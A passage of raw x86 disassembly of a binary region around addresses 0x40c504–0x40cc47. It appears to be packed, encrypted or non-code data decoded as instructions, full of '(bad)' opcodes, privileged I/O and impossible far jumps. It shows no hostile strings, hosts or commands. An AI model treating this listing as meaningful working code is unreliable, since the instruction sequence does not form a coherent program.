  40c504:	scas   eax,DWORD PTR es:[edi]
  40c505:	inc    ecx
  40c506:	push   edx
  40c507:	(bad)  
  40c508:	dec    ebx
  40c509:	psrlw  mm3,QWORD PTR [edx]
  40c50c:	sahf   
  40c50d:	fdiv   DWORD PTR [ecx+0x26]
  40c510:	xchg   edi,eax
  40c511:	in     eax,dx
  40c512:	loope  0x40c55b
  40c514:	sbb    ebp,DWORD PTR ds:0x14ce9851
  40c51a:	das    
  40c51b:	jmp    0x40c4cc
  40c51d:	mov    BYTE PTR [esi],ch
  40c51f:	fs hlt 
  40c521:	arpl   WORD PTR [edx],si
  40c523:	out    dx,eax
  40c524:	sbb    ecx,DWORD PTR [edx]
  40c526:	test   BYTE PTR gs:[edx],dl
  40c529:	and    ebp,edx
  40c52b:	and    BYTE PTR [ebp-0x63],dl
  40c52e:	inc    eax
  40c52f:	ret    0xd7f7
  40c532:	or     BYTE PTR [eax+edi*2],dh
  40c535:	cmp    eax,0xe688297e
  40c53a:	dec    ebx
  40c53b:	clc    
  40c53c:	mov    edi,0x9d43dda3
  40c541:	sbb    eax,0x59fd73f4
  40c546:	pop    ebp
  40c547:	jg     0x40c518
  40c549:	ins    BYTE PTR es:[edi],dx
  40c54a:	(bad)  
  40c54b:	and    eax,DWORD PTR [ecx+0x5227990d]
  40c551:	inc    eax
  40c552:	adc    DWORD PTR [eax+ebp*2],esp
  40c555:	sbb    edi,ecx
  40c557:	mov    ss,WORD PTR [ecx+0x1d]
  40c55a:	pop    ebx
  40c55b:	xchg   ebp,eax
  40c55c:	xor    al,0x14
  40c55e:	mov    esp,0x46453f1e
  40c563:	or     dh,BYTE PTR [esi-0x6f]
  40c566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c567:	cwde   
  40c568:	push   ss
  40c569:	fwait
  40c56a:	mov    ds:0x31279944,al
  40c56f:	push   eax
  40c570:	pop    edi
  40c571:	and    al,0xfd
  40c573:	popa   
  40c574:	cmc    
  40c575:	outs   dx,BYTE PTR ds:[esi]
  40c576:	add    BYTE PTR [esi],0xe4
  40c579:	mov    ecx,cs
  40c57b:	adc    cl,BYTE PTR [ecx+0x3bc36fbe]
  40c581:	push   es
  40c582:	int3   
  40c583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c584:	repnz ds int3 
  40c587:	lods   eax,DWORD PTR ds:[esi]
  40c588:	jg     0x40c5fc
  40c58a:	pop    es
  40c58b:	hlt    
  40c58c:	ror    ah,cl
  40c58e:	inc    ebp
  40c58f:	into   
  40c590:	(bad)  
  40c591:	js     0x40c574
  40c593:	mov    bl,0xf8
  40c595:	fidivr WORD PTR [ebp+0x4c]
  40c598:	cmp    ebp,DWORD PTR [esp+ebp*8+0x71]
  40c59c:	aad    0x50
  40c59e:	or     bh,BYTE PTR [ecx-0x1d9f053a]
  40c5a4:	xor    al,0xa8
  40c5a6:	mov    eax,0x7aff8350
  40c5ab:	bnd jge 0x40c543
  40c5ae:	xchg   edi,eax
  40c5af:	es push 0x9561f60c
  40c5b5:	mov    cl,0x18
  40c5b7:	jae    0x40c5b1
  40c5b9:	ja     0x40c5ad
  40c5bb:	cmp    esp,DWORD PTR [ebx+0x2c]
  40c5be:	mov    esp,0x9f7f940b
  40c5c3:	mov    edi,fs
  40c5c5:	push   ecx
  40c5c6:	iret   
  40c5c7:	mov    bh,0x81
  40c5c9:	xchg   esp,eax
  40c5ca:	mov    dh,0x7c
  40c5cc:	jge    0x40c5b8
  40c5ce:	fst    QWORD PTR [ebp-0x57]
  40c5d1:	clc    
  40c5d2:	bswap  ebp
  40c5d4:	push   ebx
  40c5d5:	aaa    
  40c5d6:	icebp  
  40c5d7:	ins    DWORD PTR es:[edi],dx
  40c5d8:	popf   
  40c5d9:	repnz xchg esi,eax
  40c5db:	jns    0x40c5e0
  40c5dd:	mov    dh,0xfd
  40c5df:	cmp    ah,ch
  40c5e1:	pushf  
  40c5e2:	addr16 inc ecx
  40c5e4:	inc    ecx
  40c5e5:	fnstcw WORD PTR [ecx-0x43]
  40c5e8:	push   esp
  40c5e9:	cmp    BYTE PTR [ebp+eax*4+0x432f4ef6],cl
  40c5f0:	call   0xcf1d:0x5c13fc57
  40c5f7:	cld    
  40c5f8:	hlt    
  40c5f9:	push   esi
  40c5fa:	(bad)  
  40c5fb:	push   ebx
  40c5fc:	bound  ebx,QWORD PTR [edx-0x78]
  40c5ff:	in     eax,0x98
  40c601:	mov    dh,0xce
  40c603:	jle    0x40c666
  40c605:	imul   edi,DWORD PTR [esi+0x5ae3f671],0x163394b3
  40c60f:	add    al,0xcc
  40c611:	xor    edi,DWORD PTR [eax-0x3459db33]
  40c617:	cmp    eax,0x7646f071
  40c61c:	iret   
  40c61d:	and    al,0x10
  40c61f:	es fcmovnu st,st(4)
  40c622:	shl    DWORD PTR [edx+0x6d],1
  40c625:	xchg   esp,eax
  40c626:	and    dh,BYTE PTR [ebp-0x2d]
  40c629:	inc    DWORD PTR [eax]
  40c62b:	ds pop ss
  40c62d:	daa    
  40c62e:	sbb    dh,BYTE PTR [ecx]
  40c630:	or     bl,dh
  40c632:	xlat   BYTE PTR ds:[ebx]
  40c633:	fnsave ds:0xb0a65c4a
  40c639:	clc    
  40c63a:	enter  0x5bf6,0x87
  40c63e:	push   0x34
  40c640:	popf   
  40c641:	call   0xabdd:0x9bd3f698
  40c648:	fldcw  WORD PTR [eax+0x5]
  40c64b:	sbb    esp,eax
  40c64d:	mov    DWORD PTR [eax+0x10882039],esi
  40c653:	cmp    eax,0xa1d051ea
  40c658:	fidivr DWORD PTR [eax-0x1238e8fd]
  40c65e:	dec    ebx
  40c65f:	jl     0x40c62a
  40c661:	cmc    
  40c662:	xor    eax,ebx
  40c664:	loopne 0x40c67d
  40c666:	jnp    0x40c6b1
  40c668:	inc    ebx
  40c669:	dec    ebp
  40c66a:	arpl   cx,bx
  40c66c:	sahf   
  40c66d:	and    WORD PTR [esi+0x6a],bp
  40c671:	in     eax,dx
  40c672:	jge    0x40c6c9
  40c674:	push   0xd593a42a
  40c679:	in     al,0x4e
  40c67b:	loopne 0x40c5fd
  40c67d:	test   DWORD PTR [esi-0x27],ebx
  40c680:	push   ebp
  40c681:	add    BYTE PTR [esi],ah
  40c683:	dec    ebp
  40c684:	push   ss
  40c685:	xor    BYTE PTR [ebx],0x90
  40c688:	or     eax,0x8bcfda46
  40c68d:	shl    DWORD PTR [ecx-0x3640dc46],1
  40c693:	fdivr  st,st(6)
  40c695:	(bad)  [ebx]
  40c697:	adc    eax,0x128c859c
  40c69c:	popa   
  40c69d:	push   esp
  40c69e:	call   0x875078e
  40c6a3:	push   ebx
  40c6a4:	aad    0x8c
  40c6a6:	shl    BYTE PTR cs:[edi-0x72],1
  40c6aa:	push   0x61
  40c6ac:	pop    ds
  40c6ad:	mov    ah,0x6f
  40c6af:	(bad)
  40c6b2:	push   ebx
  40c6b3:	mov    ebx,0xd8d8a7bb
  40c6b8:	adc    eax,edx
  40c6ba:	popf   
  40c6bb:	push   0x2cde45b2
  40c6c0:	mov    bl,0xc2
  40c6c2:	push   ebp
  40c6c3:	(bad)  
  40c6c4:	sti    
  40c6c5:	sbb    cl,BYTE PTR [ecx+0x7224468c]
  40c6cb:	push   cs
  40c6cc:	lahf   
  40c6cd:	loop   0x40c684
  40c6cf:	fild   WORD PTR [eax]
  40c6d1:	dec    ebx
  40c6d2:	or     ch,BYTE PTR [esp+ebp*2-0x52a9f2cd]
  40c6d9:	xor    BYTE PTR [esi-0x3f],ch
  40c6dc:	int3   
  40c6dd:	add    al,0x7b
  40c6df:	jnp    0x40c6a5
  40c6e1:	repnz and DWORD PTR [esp+eax*4+0x42153faa],ecx
  40c6e9:	and    eax,0xca6e6bc7
  40c6ee:	retf   0x42b2
  40c6f1:	cdq    
  40c6f2:	jecxz  0x40c6eb
  40c6f4:	cmp    eax,0x512123e5
  40c6f9:	pop    ds
  40c6fa:	mov    dh,0xf
  40c6fc:	neg    BYTE PTR [eax+0x45aec200]
  40c702:	mov    ah,0x2c
  40c704:	jp     0x40c70d
  40c706:	dec    esi
  40c707:	xor    bh,al
  40c709:	inc    eax
  40c70a:	std    
  40c70b:	xchg   edx,eax
  40c70c:	mov    edx,0xd356726a
  40c711:	xchg   esp,eax
  40c712:	push   eax
  40c713:	mov    al,ds:0xf27e124b
  40c718:	push   ebp
  40c719:	repnz mov ah,0x75
  40c71c:	daa    
  40c71d:	cdq    
  40c71e:	outs   dx,BYTE PTR ds:[esi]
  40c71f:	jmp    0x40c6c4
  40c721:	xlat   BYTE PTR ds:[ebx]
  40c722:	adc    eax,0xd7c5bf35
  40c727:	into   
  40c728:	jnp    0x40c6b6
  40c72a:	in     eax,0x3a
  40c72c:	cld    
  40c72d:	sbb    al,0x5d
  40c72f:	out    dx,eax
  40c730:	push   esp
  40c731:	mov    edi,0x8ce09ab7
  40c736:	lahf   
  40c737:	adc    edx,eax
  40c739:	xor    edi,DWORD PTR [edx+0x18]
  40c73c:	sub    eax,0xe6293e3c
  40c741:	sbb    eax,0xef6a87ee
  40c746:	fcomp  DWORD PTR [edx]
  40c748:	cdq    
  40c749:	pop    edx
  40c74a:	outs   dx,BYTE PTR ds:[esi]
  40c74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74c:	stos   DWORD PTR es:[edi],eax
  40c74d:	push   ds
  40c74e:	arpl   WORD PTR [edi+0x56],si
  40c751:	jmp    0x4dba4610
  40c756:	jo     0x40c7d6
  40c758:	mov    ebp,0x11a8b7fb
  40c75d:	inc    ebx
  40c75e:	es push ebx
  40c760:	ret    
  40c761:	leave  
  40c762:	adc    bl,BYTE PTR [ebx]
  40c764:	stos   DWORD PTR es:[edi],eax
  40c765:	push   ss
  40c766:	pop    edi
  40c767:	pop    eax
  40c768:	mov    eax,ds:0x7e9e587c
  40c76d:	retf   0xd010
  40c770:	in     al,dx
  40c771:	rol    dl,0xc0
  40c774:	ror    BYTE PTR [esi],1
  40c776:	mov    esp,0x9cd661c0
  40c77b:	xchg   ebp,eax
  40c77c:	inc    edx
  40c77d:	and    BYTE PTR [eax-0xe],bh
  40c780:	pop    esi
  40c781:	pop    ds
  40c782:	ret    
  40c783:	adc    esp,DWORD PTR [esi]
  40c785:	ins    BYTE PTR es:[edi],dx
  40c786:	popf   
  40c787:	daa    
  40c788:	xor    ah,ah
  40c78a:	enter  0x996c,0xaa
  40c78e:	push   ss
  40c78f:	loopne 0x40c782
  40c791:	mov    ah,0x65
  40c793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c794:	ds (bad) 
  40c796:	push   esi
  40c797:	pop    eax
  40c798:	pop    ss
  40c799:	cwde   
  40c79a:	xchg   DWORD PTR [esi-0x9],edi
  40c79d:	cdq    
  40c79e:	dec    edi
  40c79f:	mov    edx,DWORD PTR [ecx-0x4d0fb828]
  40c7a5:	cmp    DWORD PTR [ebx],ecx
  40c7a7:	pop    ebx
  40c7a8:	push   edi
  40c7a9:	inc    esp
  40c7aa:	imul   ebp,DWORD PTR [ecx-0x5db65f47],0x69
  40c7b1:	rcl    BYTE PTR [ebp-0x19883b9],1
  40c7b7:	loop   0x40c82a
  40c7b9:	outs   dx,DWORD PTR ds:[esi]
  40c7ba:	sti    
  40c7bb:	fwait
  40c7bc:	mov    ch,0x55
  40c7be:	xor    eax,0x3f909895
  40c7c3:	xor    ebp,eax
  40c7c5:	out    0x99,al
  40c7c7:	cwde   
  40c7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7c9:	xchg   ebp,eax
  40c7ca:	jmp    0x40c7e0
  40c7cc:	mov    ah,0x5b
  40c7ce:	sbb    BYTE PTR [edi+0x1d],cl
  40c7d1:	push   esi
  40c7d2:	mov    eax,ss
  40c7d4:	jno    0x40c7cb
  40c7d6:	pop    esi
  40c7d7:	mov    dl,0xd6
  40c7d9:	arpl   sp,bx
  40c7db:	sahf   
  40c7dc:	xchg   edi,eax
  40c7dd:	fidivr DWORD PTR [esi+edx*2+0x40]
  40c7e1:	or     cl,BYTE PTR [edi-0x27b4606]
  40c7e7:	mov    dl,cl
  40c7e9:	mov    ds:0xfa0725e8,al
  40c7ee:	adc    eax,DWORD PTR [ebx-0x2e3abb52]
  40c7f4:	imul   ebp,DWORD PTR [esi-0x157186ab],0x7e74ff18
  40c7fe:	pop    ds
  40c7ff:	rcr    DWORD PTR [edx],1
  40c801:	inc    eax
  40c802:	inc    eax
  40c803:	clc    
  40c804:	lahf   
  40c805:	push   ecx
  40c806:	outs   dx,DWORD PTR ds:[esi]
  40c807:	and    DWORD PTR [ecx+ecx*2],edx
  40c80a:	fmul   QWORD PTR [edx+edx*2-0x36]
  40c80e:	out    dx,eax
  40c80f:	stos   DWORD PTR es:[edi],eax
  40c810:	les    ecx,FWORD PTR [edi*4-0x63b0cfb3]
  40c817:	pushf  
  40c818:	mov    ecx,0x76743ae8
  40c81d:	xor    DWORD PTR [ebx-0x67ac94d2],edx
  40c823:	out    dx,al
  40c824:	jl     0x40c7f1
  40c826:	ficomp DWORD PTR [esp+eax*1]
  40c829:	repnz cmc 
  40c82b:	dec    esp
  40c82c:	out    dx,eax
  40c82d:	int3   
  40c82e:	adc    DWORD PTR [ecx-0x44],0x28
  40c832:	jo     0x40c876
  40c834:	fstp   DWORD PTR [ecx+0x66]
  40c837:	xchg   ecx,eax
  40c838:	out    dx,eax
  40c839:	mov    ch,0xf0
  40c83b:	mov    ecx,ebx
  40c83d:	jae    0x40c82b
  40c83f:	ja     0x40c858
  40c841:	stos   BYTE PTR es:[edi],al
  40c842:	inc    edx
  40c843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c844:	test   BYTE PTR [ebx],0x48
  40c847:	inc    esi
  40c848:	cld    
  40c849:	mov    bh,0x30
  40c84b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c84c:	xor    BYTE PTR [edx+0x0],ch
  40c84f:	mov    dh,0x90
  40c851:	pusha  
  40c852:	sbb    ah,ah
  40c854:	cmp    al,BYTE PTR [esi]
  40c856:	push   edi
  40c857:	repz mov ds:0xa45354b3,eax
  40c85d:	loop   0x40c8cb
  40c85f:	mov    edi,0x38ede876
  40c864:	mov    al,BYTE PTR [eax]
  40c866:	mov    eax,ds:0xaac59c72
  40c86b:	mov    edx,0x9da06b4a
  40c870:	popf   
  40c871:	or     al,BYTE PTR es:[eax+edx*8+0x78]
  40c876:	mov    edx,ds
  40c878:	mov    ebp,0x21085ba0
  40c87d:	dec    ebp
  40c87e:	xor    BYTE PTR [edx+0x6feca9bc],cl
  40c884:	nop
  40c885:	in     eax,0xd6
  40c887:	jnp    0x40c861
  40c889:	add    BYTE PTR [edx-0x5b],ah
  40c88c:	not    BYTE PTR [ecx-0x69]
  40c88f:	push   0x18
  40c891:	jbe    0x40c8ba
  40c893:	cmp    DWORD PTR [ebx-0x3de1cbdd],0x9d58e56c
  40c89d:	cli    
  40c89e:	push   ecx
  40c89f:	mov    cl,0x79
  40c8a1:	dec    esp
  40c8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8a3:	add    ebx,0x3f
  40c8a6:	sbb    BYTE PTR [eax+eiz*4+0x60],dl
  40c8aa:	retf   
  40c8ab:	retf   0x1c84
  40c8ae:	xor    bl,BYTE PTR [edi+0x67]
  40c8b1:	retf   
  40c8b2:	mov    bl,0x3e
  40c8b4:	and    DWORD PTR [edi+ebp*2-0x2e],eax
  40c8b8:	loopne 0x40c859
  40c8ba:	pop    esp
  40c8bb:	sub    BYTE PTR [edx+0x4d],ah
  40c8be:	icebp  
  40c8bf:	fcomp  QWORD PTR [edi-0x4b]
  40c8c2:	retf   0xbe60
  40c8c5:	(bad)  
  40c8c6:	fs pusha 
  40c8c8:	shr    BYTE PTR [ebp+0x39c1573d],cl
  40c8ce:	add    DWORD PTR [esi],ebx
  40c8d0:	mov    ebx,0x649b3275
  40c8d5:	pop    ds
  40c8d6:	test   ebp,ebp
  40c8d8:	xchg   esi,eax
  40c8d9:	icebp  
  40c8da:	fist   WORD PTR [edi]
  40c8dc:	sbb    eax,0x8ea5d9c9
  40c8e1:	and    DWORD PTR [esi+0x45],esi
  40c8e4:	mov    ds:0x424daae7,eax
  40c8e9:	mov    DWORD PTR [edx+0x48],0x35c8c6da
  40c8f0:	or     DWORD PTR [ebx+0x49],esi
  40c8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f4:	dec    ecx
  40c8f5:	add    al,0x61
  40c8f7:	scas   eax,DWORD PTR es:[edi]
  40c8f8:	loop   0x40c8c2
  40c8fa:	push   ebp
  40c8fb:	in     eax,dx
  40c8fc:	popa   
  40c8fd:	cs ins BYTE PTR es:[edi],dx
  40c8ff:	pop    eax
  40c900:	inc    edx
  40c901:	xchg   ecx,eax
  40c902:	add    BYTE PTR [ebp+0x2d16e17c],ch
  40c908:	push   0xffffffd0
  40c90a:	mov    esi,0xf37518fd
  40c90f:	je     0x40c8a2
  40c911:	dec    esp
  40c912:	push   ebx
  40c913:	daa    
  40c914:	mov    bl,0xf1
  40c916:	mov    dh,0x1f
  40c918:	xor    ebp,eax
  40c91a:	loop   0x40c963
  40c91c:	jmp    0x22f2:0xba6b46e7
  40c923:	fist   WORD PTR [eax+ebx*8+0x169af6fe]
  40c92a:	add    DWORD PTR es:[esi-0x494477ed],0x27296b58
  40c935:	(bad)  
  40c936:	in     al,dx
  40c937:	jl     0x40c8e4
  40c939:	sub    DWORD PTR [edx-0x39],edx
  40c93c:	in     al,0x85
  40c93e:	or     BYTE PTR [edx+0x3],0x0
  40c942:	pop    ebp
  40c943:	jmp    0x8ca6cee4
  40c948:	sti    
  40c949:	jne    0x40c932
  40c94b:	ret    0x2ab4
  40c94e:	add    dl,dh
  40c950:	fst    DWORD PTR [ebp-0x40]
  40c953:	mov    ds:0x7128e73c,eax
  40c958:	stc    
  40c959:	(bad)  
  40c95a:	imul   edi,ebp,0x5a2241ef
  40c960:	cdq    
  40c961:	ins    BYTE PTR es:[edi],dx
  40c962:	dec    ebp
  40c963:	pop    esp
  40c964:	push   ss
  40c965:	test   DWORD PTR [eax-0x27],ecx
  40c968:	leave  
  40c969:	dec    esi
  40c96a:	out    0xa0,al
  40c96c:	and    ch,BYTE PTR [ecx]
  40c96e:	ret    
  40c96f:	add    BYTE PTR ds:0x75d9d5dc,bh
  40c975:	out    dx,al
  40c976:	lock and eax,0x37f1cbe8
  40c97c:	(bad)  
  40c97d:	scas   al,BYTE PTR es:[edi]
  40c97e:	xchg   esi,eax
  40c97f:	bound  esp,QWORD PTR [ecx]
  40c981:	in     eax,0xf3
  40c983:	mov    ah,0xb0
  40c985:	push   eax
  40c986:	adc    dh,dl
  40c988:	jp     0x40c978
  40c98a:	or     BYTE PTR [ebx+0x514a5922],0x9f
  40c991:	sbb    al,ah
  40c993:	test   DWORD PTR [edx],edx
  40c995:	cmp    eax,0x4dc5c012
  40c99a:	in     al,dx
  40c99b:	ss std 
  40c99d:	ins    DWORD PTR es:[edi],dx
  40c99e:	push   eax
  40c99f:	call   DWORD PTR [esi+0x755815c0]
  40c9a5:	dec    ecx
  40c9a6:	jno    0x40c9cd
  40c9a8:	mov    cl,0x1e
  40c9aa:	xchg   ebp,esp
  40c9ac:	jo     0x40c959
  40c9ae:	mov    BYTE PTR [ebp+0x44cd3ce],al
  40c9b4:	pop    edi
  40c9b5:	mov    cl,0x19
  40c9b7:	out    dx,eax
  40c9b8:	mov    al,ds:0x8ac19a8d
  40c9bd:	arpl   si,bp
  40c9bf:	retf   0xb69
  40c9c2:	xor    ebp,DWORD PTR [esi-0x426d51d6]
  40c9c8:	adc    eax,0xf30fe468
  40c9cd:	scas   al,BYTE PTR es:[edi]
  40c9ce:	or     ch,bl
  40c9d0:	dec    ecx
  40c9d1:	pushf  
  40c9d2:	mov    eax,0x9163d50b
  40c9d7:	xchg   edx,eax
  40c9d8:	push   ecx
  40c9d9:	dec    ecx
  40c9da:	mov    es,WORD PTR [ecx+0x2fa0f87e]
  40c9e0:	push   ds
  40c9e1:	repz mov ebp,0xfe34614
  40c9e7:	ins    BYTE PTR es:[edi],dx
  40c9e8:	adc    eax,0x61506e4d
  40c9ed:	pop    es
  40c9ee:	ror    ebp,0xdd
  40c9f1:	inc    esp
  40c9f2:	jnp    0x40c9c6
  40c9f4:	loop   0x40c9ae
  40c9f6:	sti    
  40c9f7:	iret   
  40c9f8:	jmp    0x5ee75751
  40c9fd:	dec    ebx
  40c9fe:	inc    esp
  40c9ff:	or     eax,0xf6599f0b
  40ca04:	gs jae 0x40ca5c
  40ca07:	push   edx
  40ca08:	rol    DWORD PTR [edi-0x283e575b],cl
  40ca0e:	and    bl,BYTE PTR [edi+0x5fb0f5ac]
  40ca14:	or     BYTE PTR [ebx],dh
  40ca16:	icebp  
  40ca17:	add    ebp,DWORD PTR [esi]
  40ca19:	call   0x1455f3ad
  40ca1e:	ret    0xa701
  40ca21:	mov    ds:0xd4825c23,al
  40ca26:	xor    BYTE PTR [ecx-0xfc91f9f],dl
  40ca2c:	xchg   DWORD PTR [esi],ebx
  40ca2e:	pop    eax
  40ca2f:	mov    edx,0xb89e41de
  40ca34:	in     eax,dx
  40ca35:	mov    DWORD PTR [edi],ebp
  40ca37:	dec    ebp
  40ca38:	xor    eax,0x199ede24
  40ca3d:	adc    esi,DWORD PTR [edi]
  40ca3f:	cmp    ebp,esi
  40ca41:	add    DWORD PTR [esp+esi*1-0x24f73c49],eax
  40ca48:	fwait
  40ca49:	sub    BYTE PTR [ecx+0x6157949a],ah
  40ca4f:	jno    0x40ca81
  40ca51:	jne    0x40ca5a
  40ca53:	dec    eax
  40ca54:	in     eax,dx
  40ca55:	cmc    
  40ca56:	and    eax,0x49d9cc1b
  40ca5b:	or     al,0x16
  40ca5d:	or     bh,BYTE PTR [eax+0x1c]
  40ca60:	sbb    dl,dh
  40ca62:	or     eax,0xf0894e0a
  40ca67:	loop   0x40ca1e
  40ca69:	jbe    0x40ca90
  40ca6b:	inc    ecx
  40ca6c:	(bad)  
  40ca6d:	sbb    al,0xed
  40ca6f:	out    dx,al
  40ca70:	dec    esp
  40ca71:	pop    ss
  40ca72:	std    
  40ca73:	jmp    0x40caef
  40ca75:	xlat   BYTE PTR ds:[ebx]
  40ca76:	ins    DWORD PTR es:[edi],dx
  40ca77:	mov    cl,BYTE PTR ds:0x323508b9
  40ca7d:	loop   0x40ca8d
  40ca7f:	xchg   ebp,eax
  40ca80:	xor    DWORD PTR [esi-0x43],eax
  40ca83:	adc    BYTE PTR [edx+0x4b],al
  40ca86:	sub    DWORD PTR [edi+0x35021384],esp
  40ca8c:	push   ebp
  40ca8d:	out    dx,al
  40ca8e:	adc    al,cl
  40ca90:	dec    ebp
  40ca91:	(bad)  
  40ca92:	adc    cl,dl
  40ca94:	xchg   BYTE PTR [ecx+0x5],bl
  40ca97:	nop
  40ca98:	xchg   edi,eax
  40ca99:	inc    ebx
  40ca9a:	int3   
  40ca9b:	js     0x40cb0d
  40ca9d:	cmp    ebp,esp
  40ca9f:	mov    esp,0x6420aca
  40caa4:	(bad)  
  40caa5:	sti    
  40caa6:	mov    fs,WORD PTR [ecx]
  40caa8:	mov    ds:0x4df3ab8f,eax
  40caad:	cmc    
  40caae:	fwait
  40caaf:	out    dx,al
  40cab0:	outs   dx,BYTE PTR ds:[esi]
  40cab1:	loope  0x40ca70
  40cab3:	or     esp,DWORD PTR [esi]
  40cab5:	mov    ebp,0x2243e4b
  40caba:	mov    ds:0x4e9fd4e4,al
  40cabf:	xchg   ebp,eax
  40cac0:	mov    WORD PTR [eax+0x79],?
  40cac3:	int3   
  40cac4:	or     bh,BYTE PTR [edx]
  40cac6:	mov    bx,0xe9c9
  40caca:	rcr    DWORD PTR [edx-0x56e4ca6],cl
  40cad0:	mov    ch,ah
  40cad2:	dec    edx
  40cad3:	xor    dl,BYTE PTR [eax-0x1ddabc17]
  40cad9:	push   ss
  40cada:	inc    ebp
  40cadb:	imul   DWORD PTR [edx+eax*4-0x66]
  40cadf:	mov    ?,WORD PTR [esi+ebx*4]
  40cae2:	dec    esi
  40cae3:	inc    DWORD PTR [eax+ecx*2]
  40cae6:	dec    edi
  40cae7:	arpl   WORD PTR [esi+0x6072fa31],ax
  40caed:	jmp    0x40cb00
  40caef:	out    0x8a,eax
  40caf1:	jg     0x40caea
  40caf3:	jae    0x40cb03
  40caf5:	cld    
  40caf6:	(bad)  
  40caf7:	push   ebp
  40caf8:	dec    esp
  40caf9:	rol    BYTE PTR [edi+eiz*4],0x55
  40cafd:	repz aam 0xf7
  40cb00:	xchg   esp,eax
  40cb01:	aas    
  40cb02:	ret    
  40cb03:	cs cli 
  40cb05:	push   es
  40cb06:	aam    0x68
  40cb08:	test   DWORD PTR [esi-0x61],edi
  40cb0b:	or     al,0x73
  40cb0d:	loop   0x40cb38
  40cb0f:	aam    0xfd
  40cb11:	dec    ebp
  40cb12:	mov    eax,ds:0x2c3ded0f
  40cb17:	out    dx,al
  40cb18:	and    eax,0xf82e171b
  40cb1d:	ror    dh,1
  40cb1f:	fdivr  DWORD PTR [ecx+0x664fd4a2]
  40cb25:	lea    edi,[esi-0x1d]
  40cb28:	pop    edx
  40cb29:	dec    eax
  40cb2a:	test   al,0xfb
  40cb2c:	adc    bh,BYTE PTR [ebx]
  40cb2e:	fisubr WORD PTR [ecx-0x4a0c907]
  40cb34:	mov    esi,edx
  40cb36:	inc    ebx
  40cb37:	jb     0x40caf8
  40cb39:	jg     0x40cbad
  40cb3b:	loop   0x40cae6
  40cb3d:	push   es
  40cb3e:	add    al,0xe6
  40cb40:	inc    esi
  40cb41:	stos   DWORD PTR es:[edi],eax
  40cb42:	in     eax,0xfa
  40cb44:	imul   esi,DWORD PTR [edx+0x59],0xfffffffe
  40cb48:	push   edi
  40cb49:	xor    al,0x6f
  40cb4b:	adc    BYTE PTR [ecx-0x4],bh
  40cb4e:	sbb    BYTE PTR [edx+eax*8],ah
  40cb51:	or     edx,DWORD PTR [eax+0x7e]
  40cb54:	lock retf 
  40cb56:	or     eax,0xdad7600d
  40cb5b:	rcl    DWORD PTR [esi],cl
  40cb5d:	es jns 0x40cb2a
  40cb60:	je     0x40cb74
  40cb62:	test   DWORD PTR [edx+ecx*1+0x17f50a40],ecx
  40cb69:	mov    cl,0x33
  40cb6b:	(bad)  [edx]
  40cb6d:	lods   eax,DWORD PTR ds:[esi]
  40cb6e:	loope  0x40cb94
  40cb70:	data16 jmpw 0xfc98
  40cb75:	sub    eax,0x54de0105
  40cb7a:	and    ch,al
  40cb7c:	cmp    al,0xfa
  40cb7e:	retf   
  40cb7f:	sbb    eax,DWORD PTR [ecx-0x498784fd]
  40cb85:	cdq    
  40cb86:	retf   0x23b3
  40cb89:	gs cdq 
  40cb8b:	sub    ebx,eax
  40cb8d:	fs shr ebp,cl
  40cb90:	scas   al,BYTE PTR es:[edi]
  40cb91:	not    BYTE PTR [ebp-0x193776fe]
  40cb97:	mov    bh,0x99
  40cb99:	and    eax,0xe40def60
  40cb9e:	add    DWORD PTR [ebp-0x4a],esi
  40cba1:	pop    ecx
  40cba2:	jg     0x40cbe9
  40cba4:	fmul   QWORD PTR [edi-0x2cf3622c]
  40cbaa:	sub    BYTE PTR [edi-0x258f649b],bh
  40cbb0:	sbb    eax,eax
  40cbb2:	mov    ecx,0x85faa8f5
  40cbb7:	fld    TBYTE PTR [eax+eiz*2+0x62]
  40cbbb:	enter  0xfe22,0xd5
  40cbbf:	lods   al,BYTE PTR ds:[esi]
  40cbc0:	outs   dx,BYTE PTR ds:[esi]
  40cbc1:	mov    ch,BYTE PTR [ecx+0x159c2ece]
  40cbc7:	mov    bh,0x38
  40cbc9:	push   eax
  40cbca:	push   es
  40cbcb:	leave  
  40cbcc:	into   
  40cbcd:	push   0x6b8c5032
  40cbd2:	stc    
  40cbd3:	lock xchg DWORD PTR [edi+eiz*2+0x4e],edx
  40cbd8:	xchg   esp,ebx
  40cbda:	xchg   ebp,eax
  40cbdb:	test   al,0xad
  40cbdd:	(bad)  
  40cbde:	addr16 adc al,0xfa
  40cbe1:	xor    eax,0x26b5479c
  40cbe6:	ins    BYTE PTR es:[edi],dx
  40cbe7:	and    al,0xfd
  40cbe9:	loop   0x40cbd9
  40cbeb:	(bad)  
  40cbec:	scas   al,BYTE PTR es:[edi]
  40cbed:	fs mov ch,0xe4
  40cbf0:	shl    WORD PTR [ecx],0xff
  40cbf4:	add    eax,0xa502d34
  40cbf9:	bound  esi,QWORD PTR ds:0xe6ee038b
  40cbff:	nop
  40cc00:	scas   eax,DWORD PTR es:[edi]
  40cc01:	test   BYTE PTR [esi-0x17],bh
  40cc04:	pop    ss
  40cc05:	xlat   BYTE PTR ds:[ebx]
  40cc06:	add    ecx,DWORD PTR [edi+0x2e3b831a]
  40cc0c:	add    al,0xbd
  40cc0f:	fwait
  40cc10:	pop    esp
  40cc11:	push   edi
  40cc12:	(bad)  
  40cc13:	cmp    edi,esp
  40cc15:	and    ebx,ecx
  40cc17:	test   BYTE PTR [ebx-0x64e49c23],bh
  40cc1d:	push   esi
  40cc1e:	loop   0x40cc8b
  40cc20:	jge    0x40cbf7
  40cc22:	adc    DWORD PTR [bx+si+0x4e45],eax
  40cc27:	push   eax
  40cc28:	mov    esp,0x3ad404a0
  40cc2d:	test   eax,0xf1c65e6c
  40cc32:	jbe    0x40cc38
  40cc34:	inc    ecx
  40cc35:	call   0x2699:0x93d9107a
  40cc3c:	adc    ecx,ebp
  40cc3e:	cmp    cl,BYTE PTR ds:0xeab9a221
  40cc44:	pushf  
  40cc45:	sub    ah,BYTE PTR [ecx]
  40cc47:	or     DWORD PTR [esi+0x70],ebx
